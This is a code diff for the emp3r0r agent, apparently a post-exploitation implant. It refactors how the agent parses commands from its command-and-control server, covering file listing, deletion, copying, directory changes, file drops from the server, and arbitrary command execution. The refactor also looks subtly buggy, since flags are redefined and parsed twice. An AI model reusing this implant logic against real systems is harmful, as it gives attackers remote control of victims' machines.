@@ -15,6 +15,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/otiai10/copy"
+	"github.com/spf13/pflag"
 )
 
 // exec cmd, receive data, etc
@@ -38,6 +39,10 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 	keep_running := strings.HasSuffix(payloadSplit[1], "&") // ./program & means keep running in background
 	cmd_str := strings.TrimSuffix(payloadSplit[1], "&")
 	cmdSlice := util.ParseCmd(cmd_str)
+
+	// parse command-line arguments using pflag
+	flags := pflag.NewFlagSet(cmdSlice[0], pflag.ContinueOnError)
+	flags.Parse(cmdSlice[1:])
 
 	// send response to CC
 	sendResponse := func(resp string) {
@@ -117,19 +122,13 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 		// ls current path
 	case "ls":
-		target_dir := "."
-		if len(cmdSlice) > 1 && !strings.HasPrefix(cmdSlice[1], "--") {
-			target_dir = cmdSlice[1]
-		} else {
-			target_dir, err = os.Getwd()
-			if err != nil {
-				log.Printf("cwd: %v", err)
-				sendResponse(err.Error())
-				return
-			}
+		target_dir := flags.StringP("dir", "d", ".", "Directory to list")
+		flags.Parse(cmdSlice[1:])
+		if flags.NArg() > 0 {
+			*target_dir = flags.Arg(0)
 		}
-		log.Printf("Listing %s", target_dir)
-		out, err = util.LsPath(target_dir)
+		log.Printf("Listing %s", *target_dir)
+		out, err = util.LsPath(*target_dir)
 		if err != nil {
 			out = err.Error()
 		}
@@ -137,75 +136,80 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 		// remove file/dir
 	case "rm":
-		if len(cmdSlice) < 2 {
+		path := flags.StringP("path", "p", "", "Path to remove")
+		flags.Parse(cmdSlice[1:])
+		if *path == "" {
 			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
 			return
 		}
-
-		path := strings.Join(cmdSlice[1:], " ")
-		out = "Deleted " + path
-		if err = os.RemoveAll(path); err != nil {
-			out = fmt.Sprintf("Failed to delete %s: %v", path, err)
+		out = "Deleted " + *path
+		if err = os.RemoveAll(*path); err != nil {
+			out = fmt.Sprintf("Failed to delete %s: %v", *path, err)
 		}
 		sendResponse(out)
 
 		// mkdir
 	case "mkdir":
-		if len(cmdSlice) < 2 {
+		path := flags.StringP("path", "p", "", "Path to create")
+		flags.Parse(cmdSlice[1:])
+		if *path == "" {
 			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
 			return
 		}
-
-		path := strings.Join(cmdSlice[1:], " ")
-		out = "Mkdir " + path
-		if err = os.MkdirAll(path, 0o700); err != nil {
-			out = fmt.Sprintf("Failed to mkdir %s: %v", path, err)
+		out = "Mkdir " + *path
+		if err = os.MkdirAll(*path, 0o700); err != nil {
+			out = fmt.Sprintf("Failed to mkdir %s: %v", *path, err)
 		}
 		sendResponse(out)
 
 		// copy file/dir
 	case "cp":
-		if len(cmdSlice) < 3 {
+		src := flags.StringP("src", "s", "", "Source path")
+		dst := flags.StringP("dst", "d", "", "Destination path")
+		flags.Parse(cmdSlice[1:])
+		if *src == "" || *dst == "" {
 			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
 			return
 		}
-
-		out = fmt.Sprintf("%s has been copied to %s", cmdSlice[1], cmdSlice[2])
-		if err = copy.Copy(cmdSlice[1], cmdSlice[2]); err != nil {
-			out = fmt.Sprintf("Failed to copy %s to %s: %v", cmdSlice[1], cmdSlice[2], err)
+		out = fmt.Sprintf("%s has been copied to %s", *src, *dst)
+		if err = copy.Copy(*src, *dst); err != nil {
+			out = fmt.Sprintf("Failed to copy %s to %s: %v", *src, *dst, err)
 		}
 		sendResponse(out)
 
 		// move file/dir
 	case "mv":
-		if len(cmdSlice) < 3 {
+		src := flags.StringP("src", "s", "", "Source path")
+		dst := flags.StringP("dst", "d", "", "Destination path")
+		flags.Parse(cmdSlice[1:])
+		if *src == "" || *dst == "" {
 			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
 			return
 		}
-
-		out = fmt.Sprintf("%s has been moved to %s", cmdSlice[1], cmdSlice[2])
-		if err = os.Rename(cmdSlice[1], cmdSlice[2]); err != nil {
-			out = fmt.Sprintf("Failed to move %s to %s: %v", cmdSlice[1], cmdSlice[2], err)
+		out = fmt.Sprintf("%s has been moved to %s", *src, *dst)
+		if err = os.Rename(*src, *dst); err != nil {
+			out = fmt.Sprintf("Failed to move %s to %s: %v", *src, *dst, err)
 		}
 		sendResponse(out)
 
 		// change directory
 	case "cd":
-		out = "cd failed"
-		if len(cmdSlice) < 2 {
+		path := flags.StringP("path", "p", "", "Path to change to")
+		flags.Parse(cmdSlice[1:])
+		if *path == "" {
 			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
 			return
 		}
-
-		path := strings.Join(cmdSlice[1:], " ")
-		if os.Chdir(path) == nil {
-			out = "changed directory to " + strconv.Quote(path)
+		if os.Chdir(*path) == nil {
+			out = "changed directory to " + strconv.Quote(*path)
+		} else {
+			out = "cd failed"
 		}
 		sendResponse(out)
 
 		// current working directory
 	case "pwd":
-		if len(cmdSlice) != 1 {
+		if flags.NArg() != 0 {
 			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
 			return
 		}
@@ -221,44 +225,39 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 		// put file on agent
 	case "put":
-		if len(cmdSlice) < 4 {
+		file_to_download := flags.StringP("file", "f", "", "File to download")
+		path := flags.StringP("path", "p", "", "Destination path")
+		size := flags.Int64P("size", "s", 0, "Size of the file")
+		flags.Parse(cmdSlice[1:])
+		if *file_to_download == "" || *path == "" || *size == 0 {
 			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
 			return
 		}
-
-		file_to_download := cmdSlice[1]
-		path := cmdSlice[2]
-		size, err := strconv.ParseInt(cmdSlice[3], 10, 64)
+		_, err = DownloadViaCC(*file_to_download, *path)
 		if err != nil {
-			out = fmt.Sprintf("processCCData: cant get size of %s: %v", file_to_download, err)
-			sendResponse(out)
-			return
-		}
-		_, err = DownloadViaCC(file_to_download, path)
-		if err != nil {
-			out = fmt.Sprintf("processCCData: cant download %s: %v", file_to_download, err)
+			out = fmt.Sprintf("processCCData: cant download %s: %v", *file_to_download, err)
 			sendResponse(out)
 			return
 		}
 
 		// checksum
-		checksum := tun.SHA256SumFile(path)
-		downloadedSize := util.FileSize(path)
-		out = fmt.Sprintf("%s has been uploaded successfully, sha256sum: %s", path, checksum)
-		if downloadedSize < size {
-			out = fmt.Sprintf("Uploaded %d of %d bytes, sha256sum: %s\nYou can run `put` again to resume uploading", downloadedSize, size, checksum)
+		checksum := tun.SHA256SumFile(*path)
+		downloadedSize := util.FileSize(*path)
+		out = fmt.Sprintf("%s has been uploaded successfully, sha256sum: %s", *path, checksum)
+		if downloadedSize < *size {
+			out = fmt.Sprintf("Uploaded %d of %d bytes, sha256sum: %s\nYou can run `put` again to resume uploading", downloadedSize, *size, checksum)
 		}
 
 		sendResponse(out)
 
 	default:
 		// exec cmd using os/exec normally, sends stdout and stderr back to CC
-		if runtime.GOOS != "linux" {
+		if runtime.GOOS == "windows" {
 			if !strings.HasSuffix(cmdSlice[0], ".exe") {
 				cmdSlice[0] += ".exe"
 			}
 		}
-		cmd := exec.Command(cmdSlice[0], cmdSlice[1:]...)
+		cmd := exec.Command(cmdSlice[0], flags.Args()...)
 		var out_bytes []byte
 		out_buf := bytes.NewBuffer(out_bytes)
 		cmd.Stdout = out_buf
